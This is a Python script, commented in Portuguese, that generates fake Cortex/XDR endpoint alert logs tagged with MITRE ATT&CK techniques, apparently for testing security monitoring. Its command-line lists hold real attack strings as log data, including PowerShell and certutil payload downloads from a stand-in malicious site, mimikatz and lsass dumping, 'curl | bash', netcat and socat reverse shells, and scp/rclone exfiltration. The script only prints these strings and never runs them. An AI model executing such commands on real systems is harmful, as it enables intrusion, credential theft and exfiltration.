#!/usr/bin/env python3
"""
Gerador de logs falsos no formato (simplificado) do Cortex / XDR.

Uso:
    python3 cortex_log_generator.py --count 100 --interval 0.1 > cortex_logs.jsonl

Respeita os mesmos argumentos/fluxo do gerador de logs SSH:
- usa LogParams
- usa add_common_log_args / parse_common_log_params
- usa build_writer / close_writer
"""

import argparse
import json
import random
import time
import uuid
from ipaddress import IPv4Address
from typing import Dict, Any

from common_cli import (
    LogParams,
    add_common_log_args,
    parse_common_log_params,
    build_writer,
    close_writer,
)

# -----------------------------
# Constantes / dados sintéticos
# -----------------------------

SEVERITIES = ["low", "medium", "high"]

CATEGORIES_MITRE = [
    # --- INITIAL ACCESS (TA0001) ---
    {
        "category": "Initial Access",
        "mitre_technique": "T1566 - Phishing",
        "mitre_tactic": "TA0001 - Initial Access",
        "event_type": "Email",
        "name": "Suspicious phishing email detected",
    },
    {
        "category": "Initial Access",
        "mitre_technique": "T1190 - Exploit Public-Facing Application",
        "mitre_tactic": "TA0001 - Initial Access",
        "event_type": "Network Connection",
        "name": "Exploit attempt against public-facing application",
    },

    # --- EXECUTION (TA0002) ---
    {
        "category": "Execution",
        "mitre_technique": "T1059 - Command and Scripting Interpreter",
        "mitre_tactic": "TA0002 - Execution",
        "event_type": "Process Execution",
        "name": "Command execution via scripting interpreter",
    },
    {
        "category": "Execution",
        "mitre_technique": "T1204 - User Execution",
        "mitre_tactic": "TA0002 - Execution",
        "event_type": "Process Execution",
        "name": "User executed potentially malicious file",
    },

    # --- PERSISTENCE (TA0003) ---
    {
        "category": "Persistence",
        "mitre_technique": "T1547 - Boot or Logon Autostart Execution",
        "mitre_tactic": "TA0003 - Persistence",
        "event_type": "Registry Modification",
        "name": "Persistence via autorun registry key creation",
    },
    {
        "category": "Persistence",
        "mitre_technique": "T1136 - Create Account",
        "mitre_tactic": "TA0003 - Persistence",
        "event_type": "User Account",
        "name": "Suspicious unauthorized account creation",
    },

    # --- PRIVILEGE ESCALATION (TA0004) ---
    {
        "category": "Privilege Escalation",
        "mitre_technique": "T1068 - Exploitation for Privilege Escalation",
        "mitre_tactic": "TA0004 - Privilege Escalation",
        "event_type": "Process Execution",
        "name": "Exploit attempt to gain elevated privileges",
    },
    {
        "category": "Privilege Escalation",
        "mitre_technique": "T1548 - Abuse Elevation Control Mechanism",
        "mitre_tactic": "TA0004 - Privilege Escalation",
        "event_type": "Process Execution",
        "name": "Attempt to bypass user account control (UAC)",
    },

    # --- DEFENSE EVASION (TA0005) ---
    {
        "category": "Defense Evasion",
        "mitre_technique": "T1055 - Process Injection",
        "mitre_tactic": "TA0005 - Defense Evasion",
        "event_type": "Process Execution",
        "name": "Suspicious process injection activity",
    },
    {
        "category": "Defense Evasion",
        "mitre_technique": "T1562 - Impair Defenses",
        "mitre_tactic": "TA0005 - Defense Evasion",
        "event_type": "Process Execution",
        "name": "Attempt to disable security tools",
    },
    {
        "category": "Defense Evasion",
        "mitre_technique": "T1036 - Masquerading",
        "mitre_tactic": "TA0005 - Defense Evasion",
        "event_type": "Process Execution",
        "name": "Executable masquerading as legitimate system process",
    },

    # --- CREDENTIAL ACCESS (TA0006) ---
    {
        "category": "Credential Access",
        "mitre_technique": "T1003 - OS Credential Dumping",
        "mitre_tactic": "TA0006 - Credential Access",
        "event_type": "Process Execution",
        "name": "Credential dumping detected on LSASS process",
    },
    {
        "category": "Credential Access",
        "mitre_technique": "T1110 - Brute Force",
        "mitre_tactic": "TA0006 - Credential Access",
        "event_type": "Authentication",
        "name": "Multiple failed login attempts detected",
    },
    {
        "category": "Credential Access",
        "mitre_technique": "T1555 - Credentials from Password Stores",
        "mitre_tactic": "TA0006 - Credential Access",
        "event_type": "Process Execution",
        "name": "Attempt to extract browser or password vault credentials",
    },

    # --- DISCOVERY (TA0007) ---
    {
        "category": "Discovery",
        "mitre_technique": "T1087 - Account Discovery",
        "mitre_tactic": "TA0007 - Discovery",
        "event_type": "Process Execution",
        "name": "Enumeration of user accounts",
    },
    {
        "category": "Discovery",
        "mitre_technique": "T1046 - Network Service Scanning",
        "mitre_tactic": "TA0007 - Discovery",
        "event_type": "Network Scan",
        "name": "Suspicious network scanning behavior",
    },
    {
        "category": "Discovery",
        "mitre_technique": "T1083 - File and Directory Discovery",
        "mitre_tactic": "TA0007 - Discovery",
        "event_type": "File Access",
        "name": "Large-scale file system enumeration",
    },

    # --- LATERAL MOVEMENT (TA0008) ---
    {
        "category": "Lateral Movement",
        "mitre_technique": "T1021 - Remote Services",
        "mitre_tactic": "TA0008 - Lateral Movement",
        "event_type": "Network Connection",
        "name": "Suspicious remote service authentication",
    },
    {
        "category": "Lateral Movement",
        "mitre_technique": "T1570 - Lateral Tool Transfer",
        "mitre_tactic": "TA0008 - Lateral Movement",
        "event_type": "File Transfer",
        "name": "Tool transferred laterally across systems",
    },

    # --- COLLECTION (TA0009) ---
    {
        "category": "Collection",
        "mitre_technique": "T1005 - Data from Local System",
        "mitre_tactic": "TA0009 - Collection",
        "event_type": "File Access",
        "name": "Mass collection of local files detected",
    },
    {
        "category": "Collection",
        "mitre_technique": "T1560 - Archive Collected Data",
        "mitre_tactic": "TA0009 - Collection",
        "event_type": "Process Execution",
        "name": "Large data archive operation detected",
    },

    # --- EXFILTRATION (TA0010) ---
    {
        "category": "Exfiltration",
        "mitre_technique": "T1041 - Exfiltration Over C2 Channel",
        "mitre_tactic": "TA0010 - Exfiltration",
        "event_type": "Network Connection",
        "name": "Possible data exfiltration to external C2 host",
    },
    {
        "category": "Exfiltration",
        "mitre_technique": "T1048 - Exfiltration Over Alternative Protocol",
        "mitre_tactic": "TA0010 - Exfiltration",
        "event_type": "Network Connection",
        "name": "Unusual outbound traffic over non-standard protocol",
    },

    # --- COMMAND AND CONTROL (TA0011) ---
    {
        "category": "Command and Control",
        "mitre_technique": "T1071.001 - Web Protocols",
        "mitre_tactic": "TA0011 - Command and Control",
        "event_type": "Network Connection",
        "name": "Outbound beaconing using HTTP/HTTPS detected",
    },
    {
        "category": "Command and Control",
        "mitre_technique": "T1095 - Non-Application Layer Protocol",
        "mitre_tactic": "TA0011 - Command and Control",
        "event_type": "Network Connection",
        "name": "C2 communication over custom protocol detected",
    },
    {
        "category": "Command and Control",
        "mitre_technique": "T1105 - Ingress Tool Transfer",
        "mitre_tactic": "TA0011 - Command and Control",
        "event_type": "File Transfer",
        "name": "Suspicious download of remote tool",
    },
]


# hostnames iniciados em NB-, DESK-, SERVER-
NB_HOSTS = [
    "NB-GOKU01",
    "NB-VEGETA02",
    "NB-BULMA01",
    "NB-TRUNKS01",
]

DESK_HOSTS = [
    "DESK-FINANCE01",
    "DESK-MARKETING02",
    "DESK-DEV01",
    "DESK-SOC01",
]

SERVER_HOSTS = [
    "SERVER-AD01",
    "SERVER-DB01",
    "SERVER-WEB01",
    "SERVER-FILE01",
]

ALL_HOSTS = NB_HOSTS + DESK_HOSTS + SERVER_HOSTS

USERS = [
    "bulma",
    "goku.ssj",
    "vegeta",
    "trunks.future",
    "gohan",
    "krillin",
    "piccolo.sr",
    "frieza",
    "zarbon",
    "devops",
    "analyst",
]

OS_TYPES = [
    ("Windows", "10.0.22631"),
    ("Windows Server", "2019"),
    ("macOS", "15.6.0"),
    ("Linux", "6.1.0"),
]

MODULES = [
    "Behavioral Threat Protection",
    "Malware Protection",
    "Exploit Protection",
]

ACTIONS = [
    ("BLOCKED", "Prevented (Blocked)"),
    ("DETECTED", "Detected (Not Blocked)"),
]


# -----------------------------
# Funções auxiliares
# -----------------------------


def _random_ip() -> str:
    return str(IPv4Address(random.randint(0, 2**32 - 1)))


def _now_ms() -> int:
    """Epoch em milissegundos UTC."""
    return int(time.time() * 1000)


def _random_hex(n_bytes: int = 16) -> str:
    return uuid.uuid4().hex[: n_bytes * 2]


def _random_mac() -> str:
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def _build_host() -> Dict[str, str]:
    host_name = random.choice(ALL_HOSTS)
    # FQDN simples baseado no hostname
    agent_fqdn = f"{host_name.lower()}.corp.local"
    host_ip = _random_ip()
    return {
        "host_name": host_name,
        "agent_fqdn": agent_fqdn,
        "host_ip": host_ip,
    }


def _build_os() -> Dict[str, str]:
    os_type, os_sub = random.choice(OS_TYPES)
    return {
        "agent_os_type": os_type,
        "agent_os_sub_type": os_sub,
    }


def _build_process_fields(agent_os_type: str) -> Dict[str, Any]:
    """Escolhe processos e linhas de comando coerentes com o SO."""

    # ---------------- WINDOWS / WINDOWS SERVER ----------------
    if "Windows" in agent_os_type:
        processes = [
            # --- Windows legítimos comuns ---
            ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe"),
            ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe", "powershell_ise.exe"),
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
            ("C:\\Windows\\explorer.exe", "explorer.exe"),
            ("C:\\Windows\\System32\\svchost.exe", "svchost.exe"),
            ("C:\\Windows\\System32\\lsass.exe", "lsass.exe"),
            ("C:\\Windows\\System32\\services.exe", "services.exe"),
            ("C:\\Windows\\System32\\spoolsv.exe", "spoolsv.exe"),
            ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe"),
            ("C:\\Windows\\System32\\conhost.exe", "conhost.exe"),
            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe"),
            ("C:\\Program Files\\Mozilla Firefox\\firefox.exe", "firefox.exe"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "WINWORD.EXE"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "EXCEL.EXE"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),

            # --- LOLBins / ferramentas administrativas ---
            ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe"),
            ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe"),
            ("C:\\Windows\\System32\\mshta.exe", "mshta.exe"),
            ("C:\\Windows\\System32\\certutil.exe", "certutil.exe"),
            ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin.exe"),
            ("C:\\Windows\\System32\\wmic.exe", "wmic.exe"),
            ("C:\\Windows\\System32\\wscript.exe", "wscript.exe"),
            ("C:\\Windows\\System32\\cscript.exe", "cscript.exe"),
            ("C:\\Windows\\System32\\schtasks.exe", "schtasks.exe"),
            ("C:\\Windows\\System32\\net.exe", "net.exe"),
            ("C:\\Windows\\System32\\net1.exe", "net1.exe"),
            ("C:\\Windows\\System32\\sc.exe", "sc.exe"),
            ("C:\\Windows\\System32\\whoami.exe", "whoami.exe"),
            ("C:\\Windows\\System32\\wevtutil.exe", "wevtutil.exe"),
            ("C:\\Windows\\System32\\tasklist.exe", "tasklist.exe"),
            ("C:\\Windows\\System32\\taskkill.exe", "taskkill.exe"),
            ("C:\\Windows\\System32\\nslookup.exe", "nslookup.exe"),

            # --- Ferramentas de administração / movimento lateral ---
            ("C:\\Windows\\System32\\mstsc.exe", "mstsc.exe"),
            ("C:\\Program Files\\Sysinternals\\PsExec.exe", "PsExec.exe"),
            ("C:\\Program Files\\Sysinternals\\procdump64.exe", "procdump64.exe"),
            ("C:\\Program Files\\Sysinternals\\Procmon.exe", "Procmon.exe"),

            # --- Ferramentas de ataque / pós-exploração conhecidas ---
            ("C:\\Tools\\mimikatz\\mimikatz.exe", "mimikatz.exe"),
            ("C:\\Users\\Public\\mimikatz.exe", "mimikatz.exe"),
            ("C:\\ProgramData\\cs\\beacon.exe", "beacon.exe"),
            ("C:\\Users\\Public\\beacon.exe", "beacon.exe"),
            ("C:\\Users\\Public\\payload.exe", "payload.exe"),
            ("C:\\Users\\Public\\svhost.exe", "svhost.exe"),  # typo comum em malware
            ("C:\\Users\\Public\\update.exe", "update.exe"),
            ("C:\\Users\\Public\\runme.exe", "runme.exe"),
            ("C:\\Users\\Public\\rat_client.exe", "rat_client.exe"),
            ("C:\\ProgramData\\qbot\\qbot.exe", "qbot.exe"),
            ("C:\\ProgramData\\emotet\\emotet.exe", "emotet.exe"),
            ("C:\\ProgramData\\trickbot\\trickbot.exe", "trickbot.exe"),

            # --- Ferramentas de compressão / exfiltração ---
            ("C:\\Program Files\\7-Zip\\7z.exe", "7z.exe"),
            ("C:\\Program Files\\WinRAR\\WinRAR.exe", "WinRAR.exe"),
            ("C:\\Program Files\\rclone\\rclone.exe", "rclone.exe"),
        ]

        image_path, image_name = random.choice(processes)

        cmdlines = [
            image_path,
            f"{image_path} --help",
            f"{image_path} -v",
            f'{image_path} -ExecutionPolicy Bypass -File C:\\Users\\Public\\script.ps1',
            f'{image_path} -nop -w hidden -enc SQBFAFgA...',
            f'{image_path} -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious[.]site/payload.ps1\')"',
            "C:\\Tools\\mimikatz\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
            "C:\\Program Files\\Sysinternals\\procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
            "C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\payload.dll,Run",
            "C:\\Windows\\System32\\regsvr32.exe /s /u /i:http://malicious[.]site/payload.sct scrobj.dll",
            "C:\\Windows\\System32\\mshta.exe http://malicious[.]site/payload.hta",
            "C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://malicious[.]site/payload.bin C:\\Users\\Public\\payload.bin",
            "C:\\Windows\\System32\\bitsadmin.exe /transfer job1 http://malicious[.]site/payload.exe C:\\Users\\Public\\payload.exe",
            "C:\\Program Files\\Sysinternals\\PsExec.exe \\\\SERVER-AD01 -u corp\\admin -p Passw0rd cmd.exe",
            "wmic /node:10.10.10.10 process call create \"powershell.exe -nop -w hidden -enc SQBFAFgA\"",
            "rclone.exe sync C:\\Finance\\ remote:exfiltration/finance --config C:\\ProgramData\\rclone.conf",
            "7z.exe a C:\\Temp\\finance.7z C:\\Finance\\* -pP@ssw0rd!",
        ]

        return {
            "actor_process_image_path": image_path,
            "actor_process_image_name": image_name,
            "actor_process_command_line": random.choice(cmdlines),
            "actor_process_signature_status": random.choice(["Signed", "Unsigned"]),
            "actor_process_signature_vendor": random.choice(
                ["Microsoft Corporation", "Software Signing", None]
            ),
            "actor_process_image_sha256": _random_hex(32),
            "actor_process_image_md5": _random_hex(8),
            "actor_process_os_pid": random.randint(1000, 9999),
            "actor_process_instance_id": _random_hex(8),
            "actor_process_causality_id": _random_hex(8),
        }

    # ---------------- macOS ----------------
    if "macOS" in agent_os_type:
        processes = [
            ("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "Google Chrome"),
            ("/Applications/Firefox.app/Contents/MacOS/firefox", "firefox"),
            ("/Applications/Safari.app/Contents/MacOS/Safari", "Safari"),
            ("/usr/bin/python3", "python3"),
            ("/usr/bin/python", "python"),
            ("/usr/bin/bash", "bash"),
            ("/bin/sh", "sh"),
            ("/usr/bin/zsh", "zsh"),
            ("/usr/bin/ssh", "ssh"),
            ("/usr/bin/scp", "scp"),
            ("/usr/bin/sftp", "sftp"),
            ("/usr/bin/curl", "curl"),
            ("/usr/bin/wget", "wget"),
            ("/usr/bin/nc", "nc"),
            ("/usr/bin/socat", "socat"),
            ("/usr/sbin/sshd", "sshd"),
            ("/usr/bin/osascript", "osascript"),
        ]

        image_path, image_name = random.choice(processes)

        cmdlines = [
            image_path,
            f"{image_path} --help",
            f"{image_path} -v",
            f"/usr/bin/python3 beacon.py --server https://c2.malicious[.]site --interval 30",
            "/usr/bin/curl -s http://malicious[.]site/payload.sh | /bin/bash",
            "/usr/bin/curl -o /tmp/payload http://malicious[.]site/payload && chmod +x /tmp/payload && /tmp/payload",
            "/usr/bin/nc -e /bin/sh 203.0.113.10 4444",
            "/usr/bin/socat TCP:203.0.113.11:443 EXEC:/bin/bash",
            "/usr/bin/ssh devops@192.0.2.10 -p 22",
            "/usr/bin/scp /tmp/data.tar.gz attacker@198.51.100.5:/tmp/",
        ]

        return {
            "actor_process_image_path": image_path,
            "actor_process_image_name": image_name,
            "actor_process_command_line": random.choice(cmdlines),
            "actor_process_signature_status": random.choice(["Signed", "Unsigned"]),
            "actor_process_signature_vendor": random.choice(
                ["Apple Inc.", "Software Signing", None]
            ),
            "actor_process_image_sha256": _random_hex(32),
            "actor_process_image_md5": _random_hex(8),
            "actor_process_os_pid": random.randint(1000, 9999),
            "actor_process_instance_id": _random_hex(8),
            "actor_process_causality_id": _random_hex(8),
        }

    # ---------------- Linux (default) ----------------
    processes = [
        ("/usr/bin/python3", "python3"),
        ("/usr/bin/python", "python"),
        ("/usr/bin/perl", "perl"),
        ("/usr/bin/bash", "bash"),
        ("/bin/sh", "sh"),
        ("/usr/bin/zsh", "zsh"),
        ("/usr/bin/ssh", "ssh"),
        ("/usr/bin/scp", "scp"),
        ("/usr/bin/sftp", "sftp"),
        ("/usr/bin/curl", "curl"),
        ("/usr/bin/wget", "wget"),
        ("/usr/bin/nc", "nc"),
        ("/usr/bin/ncat", "ncat"),
        ("/usr/bin/socat", "socat"),
        ("/usr/bin/nmap", "nmap"),
        ("/usr/bin/tcpdump", "tcpdump"),
        ("/usr/bin/openssl", "openssl"),
        ("/usr/bin/tar", "tar"),
        ("/usr/sbin/sshd", "sshd"),
    ]

    image_path, image_name = random.choice(processes)

    cmdlines = [
        image_path,
        f"{image_path} --help",
        f"{image_path} -v",
        "/usr/bin/python3 beacon.py --server https://c2.malicious[.]site --interval 60",
        "/usr/bin/curl -s http://malicious[.]site/payload.sh | /bin/bash",
        "/usr/bin/wget http://malicious[.]site/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload",
        "/usr/bin/nc -e /bin/sh 203.0.113.10 4444",
        "/usr/bin/socat TCP:203.0.113.11:443 EXEC:/bin/bash",
        "/usr/bin/ssh devops@192.0.2.10 -p 2222",
        "/usr/bin/scp /tmp/data.tar.gz attacker@198.51.100.5:/tmp/",
        "/usr/bin/tar -czvf /tmp/data.tar.gz /var/www/html",
    ]

    return {
        "actor_process_image_path": image_path,
        "actor_process_image_name": image_name,
        "actor_process_command_line": random.choice(cmdlines),
        "actor_process_signature_status": random.choice(["Signed", "Unsigned"]),
        "actor_process_signature_vendor": random.choice(
            ["Software Signing", None]
        ),
        "actor_process_image_sha256": _random_hex(32),
        "actor_process_image_md5": _random_hex(8),
        "actor_process_os_pid": random.randint(1000, 9999),
        "actor_process_instance_id": _random_hex(8),
        "actor_process_causality_id": _random_hex(8),
    }


def _build_cortex_event(case_id_base: int) -> Dict[str, Any]:
    profile = random.choice(CATEGORIES_MITRE)
    host_info = _build_host()
    os_info = _build_os()
    proc_info = _build_process_fields(os_info["agent_os_type"])

    severity = random.choice(SEVERITIES)
    module_id = random.choice(MODULES)
    action, action_pretty = random.choice(ACTIONS)
    user_name = random.choice(USERS)

    now_ms = _now_ms()

    event: Dict[str, Any] = {
        "category": profile["category"],
        "alert_domain": "DOMAIN_SECURITY",
        "external_id": _random_hex(16),
        "severity": severity,
        "matching_status": "MATCHED",
        "end_match_attempt_ts": None,
        "local_insert_ts": now_ms,
        "last_modified_ts": None,
        "bioc_indicator": None,
        "matching_service_rule_id": None,
        "variation_rule_id": None,
        "attempt_counter": 0,
        "bioc_category_enum_key": None,
        "case_id": case_id_base + random.randint(1, 1000),
        "is_whitelisted": False,
        "starred": False,
        "deduplicate_tokens": None,
        "filter_rule_id": None,
        "mitre_technique_id_and_name": profile["mitre_technique"],
        "mitre_tactic_id_and_name": profile["mitre_tactic"],
        "agent_version": "9.0.0.16757",
        "agent_ip_addresses_v6": None,
        "agent_device_domain": "CORP",
        "agent_fqdn": host_info["agent_fqdn"],
        "agent_data_collection_status": True,
        "mac": _random_mac(),
        "agent_is_vdi": False,
        "agent_install_type": "STANDARD",
        "agent_host_boot_time": 0,
        "event_sub_type": None,
        "module_id": module_id,
        "association_strength": random.choice([25, 50, 75]),
        "dst_association_strength": None,
        "story_id": None,
        "event_id": None,
        "event_type": profile["event_type"],
        "event_timestamp": now_ms,
        "action_country": "UNKNOWN",
        "action_process_signature_status": "N/A",
        "os_actor_process_signature_status": "N/A",
        "fw_is_phishing": "N/A",
        "is_pcap": False,
        "contains_featured_host": "NO",
        "contains_featured_user": "NO",
        "contains_featured_ip": "NO",
        "alert_type": "Unclassified",
        "resolution_status": "STATUS_010_NEW",
        "resolution_comment": None,
        "dynamic_fields": None,
        "tags": "DS:PANW/XDR Agent,DOM:Security",
        "malicious_urls": None,
        "alert_id": str(random.randint(8_000_000, 9_999_999)),
        "detection_timestamp": now_ms,
        "name": profile["name"],
        "endpoint_id": _random_hex(16),
        "description": profile["name"],
        "host_ip": host_info["host_ip"],
        "host_name": host_info["host_name"],
        "source": "XDR Agent",
        "action": action,
        "action_pretty": action_pretty,
        "user_name": user_name,
        "events_length": 1,
        "original_tags": "DOM:Security,DS:PANW/XDR Agent",
    }

    # Campos de processo + OS (merge)
    event.update(proc_info)
    event.update(os_info)

    return event


# -----------------------------
# Função principal de geração
# -----------------------------


def generate_cortex_logs(params: LogParams) -> None:
    """
    Gera logs falsos de Cortex/XDR em JSON, um por linha (JSONL),
    respeitando os mesmos parâmetros de LogParams usados no script de SSH:
        - params.seed
        - params.count
        - params.interval
    """
    if params.seed is not None:
        random.seed(params.seed)

    writer = build_writer(params)

    try:
        count = 0
        case_id_base = random.randint(15000, 30000)

        while params.count == 0 or count < params.count:
            event = _build_cortex_event(case_id_base)
            line = json.dumps(event, ensure_ascii=False)
            writer(line)
            count += 1
            time.sleep(params.interval)
    finally:
        close_writer(writer)


def main() -> None:
    parser = argparse.ArgumentParser(description="Gerador de logs falsos estilo Cortex/XDR")
    add_common_log_args(parser)
    args = parser.parse_args()

    params = parse_common_log_params(args)
    generate_cortex_logs(params)


if __name__ == "__main__":
    main()
